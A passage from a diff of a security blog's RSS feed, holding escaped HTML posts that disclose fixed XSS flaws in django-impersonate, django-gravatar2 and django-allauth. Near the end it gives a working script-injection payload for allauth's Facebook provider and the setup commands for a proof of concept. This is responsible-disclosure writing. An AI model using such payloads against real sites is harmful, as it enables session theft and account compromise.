+&lt;div class="code"&gt;&lt;pre class="code html"&gt;&lt;a id="rest_code_c069e7dff062423d822a15c1a018c59c-1" name="rest_code_c069e7dff062423d822a15c1a018c59c-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_c069e7dff062423d822a15c1a018c59c-1"&gt;&lt;/a&gt;{% gravatar user size|escape "User profile" class|escape %}
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/aside&gt;
+&lt;/section&gt;
+&lt;section id="timeline-1"&gt;
+&lt;h3&gt;Timeline&lt;/h3&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;21/06/2024&lt;/strong&gt;: Found and reported the vulnerability to the maintainer.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;21/06/2024&lt;/strong&gt;: Maintainer replied and confirmed the vulnerability.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;29/08/2024&lt;/strong&gt;: Maintainer released version 1.4.5 with the fix.&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/section&gt;
+&lt;/section&gt;
+&lt;section id="more-in-common-than-you-think"&gt;
+&lt;h2&gt;More in common than you think&lt;/h2&gt;
+&lt;p&gt;Apart from sharing the same vulnerability, there are other similarities between the two packages:&lt;/p&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;&lt;p&gt;Widely used packages.
+At the time of writing, &lt;a class="reference external" href="https://pypistats.org/packages/django-impersonate"&gt;django-impersonate had 220K downloads in the last month&lt;/a&gt;,
+and &lt;a class="reference external" href="https://pypistats.org/packages/django-gravatar2"&gt;django-gravatar2 had 32K downloads in the last month&lt;/a&gt;.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Mostly maintained by a single person.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Not actively maintained.&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;While the functionality that both packages provide is very specific,
+they may be considered complete and stable without the need for active development.
+But as with any software, there is always room for improvement,
+or updates to keep up with the latest versions of Python and Django.&lt;/p&gt;
+&lt;p&gt;If you or your company use these packages,
+please consider contributing to them in any way you can.
+Another thing these packages have in common is that they are looking for maintainers,
+so if you have the time and knowledge, consider helping them.&lt;/p&gt;
+&lt;/section&gt;
+&lt;section id="acknowledgements"&gt;
+&lt;h2&gt;Acknowledgements&lt;/h2&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;&lt;p&gt;Thanks to &lt;a class="reference external" href="https://petersanchez.com/"&gt;Peter Sanchez&lt;/a&gt; (maintainer of django-impersonate),
+and &lt;a class="reference external" href="https://github.com/twaddington"&gt;Tristan Waddington&lt;/a&gt; (maintainer of django-gravatar2)
+for their quick responses and fixes.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;It's also great I have the support at Read the Docs to spend part of my work time on security audits on packages we use.
+Even if the vulnerabilities don't affect our systems directly,
+it's nice to have the chance to give back to the community.&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/section&gt;</description><category>django</category><category>python</category><category>security</category><category>xss</category><guid>https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/</guid><pubDate>Sat, 08 Feb 2025 05:00:00 GMT</pubDate></item><item><title>XSS in django-allauth 0.63.5</title><link>https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/</link><dc:creator>Santos Gallegos</dc:creator><description>&lt;p&gt;This post details a Cross-Site Scripting (XSS) vulnerability I discovered in &lt;a class="reference external" href="https://allauth.org/"&gt;django-allauth&lt;/a&gt;, a popular Django package for authentication.
 This vulnerability affected the Facebook provider only, and it was fixed in version &lt;a class="reference external" href="https://allauth.org/news/2024/07/django-allauth-0.63.6-released/"&gt;0.63.6&lt;/a&gt; on July 12, 2024.&lt;/p&gt;
 &lt;section id="background"&gt;
 &lt;h2&gt;Background&lt;/h2&gt;
@@ -42,7 +347,7 @@ like the login page (&lt;code class="docutils literal"&gt;/accounts/login/&lt;/c
 &lt;section id="payload"&gt;
 &lt;h2&gt;Payload&lt;/h2&gt;
 &lt;p&gt;To exploit this vulnerability, an attacker could inject the following content in the &lt;code class="docutils literal"&gt;scope&lt;/code&gt; query parameter:&lt;/p&gt;
-&lt;div class="code"&gt;&lt;pre class="code html"&gt;&lt;a id="rest_code_77d849c7f2df46989706e24e9145caab-1" name="rest_code_77d849c7f2df46989706e24e9145caab-1" href="https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/#rest_code_77d849c7f2df46989706e24e9145caab-1"&gt;&lt;/a&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;domain&lt;/span&gt;&lt;span class="p"&gt;)&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;div class="code"&gt;&lt;pre class="code html"&gt;&lt;a id="rest_code_d7f6a5c7341a4af183f1c45eb05c18ae-1" name="rest_code_d7f6a5c7341a4af183f1c45eb05c18ae-1" href="https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/#rest_code_d7f6a5c7341a4af183f1c45eb05c18ae-1"&gt;&lt;/a&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;domain&lt;/span&gt;&lt;span class="p"&gt;)&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;What this does is:&lt;/p&gt;
 &lt;ul class="simple"&gt;
@@ -56,12 +361,12 @@ like the login page (&lt;code class="docutils literal"&gt;/accounts/login/&lt;/c
 &lt;p&gt;I created a &lt;a class="reference external" href="https://github.com/stsewd/poc-xss-django-allauth"&gt;proof of concept&lt;/a&gt; to demonstrate the vulnerability, so you can see it in action,
 you just need to have Python and &lt;a class="reference external" href="https://docs.astral.sh/uv/getting-started/installation/"&gt;uv&lt;/a&gt; installed:&lt;/p&gt;
 &lt;p&gt;It consists of a simple Django project with &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;django-allauth==0.63.5&lt;/span&gt;&lt;/code&gt; installed, and a Facebook provider configured using the JavaScript SDK.&lt;/p&gt;
-&lt;div class="code"&gt;&lt;pre class="code bash"&gt;&lt;a id="rest_code_00d119fdff814c4e9bd0f068761a9d26-1" name="rest_code_00d119fdff814c4e9bd0f068761a9d26-1" href="https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/#rest_code_00d119fdff814c4e9bd0f068761a9d26-1"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;git&lt;span class="w"&gt; &lt;/span&gt;clone&lt;span class="w"&gt; &lt;/span&gt;https://github.com/stsewd/poc-xss-django-allauth
-&lt;a id="rest_code_00d119fdff814c4e9bd0f068761a9d26-2" name="rest_code_00d119fdff814c4e9bd0f068761a9d26-2" href="https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/#rest_code_00d119fdff814c4e9bd0f068761a9d26-2"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;poc-xss-django-allauth
-&lt;a id="rest_code_00d119fdff814c4e9bd0f068761a9d26-3" name="rest_code_00d119fdff814c4e9bd0f068761a9d26-3" href="https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/#rest_code_00d119fdff814c4e9bd0f068761a9d26-3"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;uv&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;manage.py&lt;span class="w"&gt; &lt;/span&gt;migrate
-&lt;a id="rest_code_00d119fdff814c4e9bd0f068761a9d26-4" name="rest_code_00d119fdff814c4e9bd0f068761a9d26-4" href="https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/#rest_code_00d119fdff814c4e9bd0f068761a9d26-4"&gt;&lt;/a&gt;&lt;span class="c1"&gt;# Create a user to log into the application.&lt;/span&gt;
-&lt;a id="rest_code_00d119fdff814c4e9bd0f068761a9d26-5" name="rest_code_00d119fdff814c4e9bd0f068761a9d26-5" href="https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/#rest_code_00d119fdff814c4e9bd0f068761a9d26-5"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;uv&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;manage.py&lt;span class="w"&gt; &lt;/span&gt;createsuperuser
-&lt;a id="rest_code_00d119fdff814c4e9bd0f068761a9d26-6" name="rest_code_00d119fdff814c4e9bd0f068761a9d26-6" href="https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/#rest_code_00d119fdff814c4e9bd0f068761a9d26-6"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;uv&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;manage.py&lt;span class="w"&gt; &lt;/span&gt;runserver
+&lt;div class="code"&gt;&lt;pre class="code bash"&gt;&lt;a id="rest_code_58adb01dff52438dacd7eb026b0db6c5-1" name="rest_code_58adb01dff52438dacd7eb026b0db6c5-1" href="https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/#rest_code_58adb01dff52438dacd7eb026b0db6c5-1"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;git&lt;span class="w"&gt; &lt;/span&gt;clone&lt;span class="w"&gt; &lt;/span&gt;https://github.com/stsewd/poc-xss-django-allauth
+&lt;a id="rest_code_58adb01dff52438dacd7eb026b0db6c5-2" name="rest_code_58adb01dff52438dacd7eb026b0db6c5-2" href="https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/#rest_code_58adb01dff52438dacd7eb026b0db6c5-2"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;poc-xss-django-allauth
+&lt;a id="rest_code_58adb01dff52438dacd7eb026b0db6c5-3" name="rest_code_58adb01dff52438dacd7eb026b0db6c5-3" href="https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/#rest_code_58adb01dff52438dacd7eb026b0db6c5-3"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;uv&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;manage.py&lt;span class="w"&gt; &lt;/span&gt;migrate
+&lt;a id="rest_code_58adb01dff52438dacd7eb026b0db6c5-4" name="rest_code_58adb01dff52438dacd7eb026b0db6c5-4" href="https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/#rest_code_58adb01dff52438dacd7eb026b0db6c5-4"&gt;&lt;/a&gt;&lt;span class="c1"&gt;# Create a user to log into the application.&lt;/span&gt;
+&lt;a id="rest_code_58adb01dff52438dacd7eb026b0db6c5-5" name="rest_code_58adb01dff52438dacd7eb026b0db6c5-5" href="https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/#rest_code_58adb01dff52438dacd7eb026b0db6c5-5"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;uv&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;manage.py&lt;span class="w"&gt; &lt;/span&gt;createsuperuser
+&lt;a id="rest_code_58adb01dff52438dacd7eb026b0db6c5-6" name="rest_code_58adb01dff52438dacd7eb026b0db6c5-6" href="https://stsewd.dev/posts/xss-in-django-allauth-fb-provider/#rest_code_58adb01dff52438dacd7eb026b0db6c5-6"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;uv&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;manage.py&lt;span class="w"&gt; &lt;/span&gt;runserver
 &lt;/pre&gt;&lt;/div&gt;
 &lt;dl class="simple"&gt;
 &lt;dt&gt;XSS in login page:&lt;/dt&gt;
